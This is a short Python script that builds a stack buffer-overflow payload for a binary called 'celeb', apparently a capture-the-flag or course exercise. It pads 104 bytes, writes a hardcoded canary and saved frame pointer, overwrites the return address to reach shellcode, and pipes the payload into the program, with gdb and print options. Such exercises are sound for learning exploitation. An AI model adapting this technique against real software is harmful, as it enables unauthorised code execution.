#!/usr/bin/env python3

intro   = b"A" * 104
canary  = b"\x55\xaa\x00\x00\x00\x00\x00\x00"
main_rbp = b"\x10\xdd\xff\xff\xff\x7f\x00\x00" # we need 8 bytes of padding, so
                                               # might aswell restore main's rbp
shellcode_call_addr = b"\x2e\x14\x40"

exploit = intro + canary + main_rbp + shellcode_call_addr + b"\n"

if __name__ == "__main__":
    import sys, subprocess, argparse

    parser = argparse.ArgumentParser(prog = "doit_celeb")
    parser.add_argument("-d", "--debug", action = "store_true",
                        help = "Debug using gdb_scripts/celeb_debug.gdb")
    parser.add_argument("-p", "--print-exploit", action = "store_true",
                        help = "Write exploit to stdout")
    parser.add_argument("-e", "--exploit", default = "celeb_exploit.b",
                        help = "exploit path")
    parser.add_argument("-s", "--shellcode", default = "shellcode",
                        help = "shellcode path")
    args = parser.parse_args()


    if args.print_exploit:
        sys.stdout.buffer.write(exploit)

    elif args.debug:
        subprocess.call(
            "gdb --command=gdb_scripts/celeb_debug.gdb ./celeb",
            shell = True)
    else:
        subprocess.call(
            f"cat {args.exploit} - | ./celeb \"$(cat {args.shellcode})\"",
            shell = True)
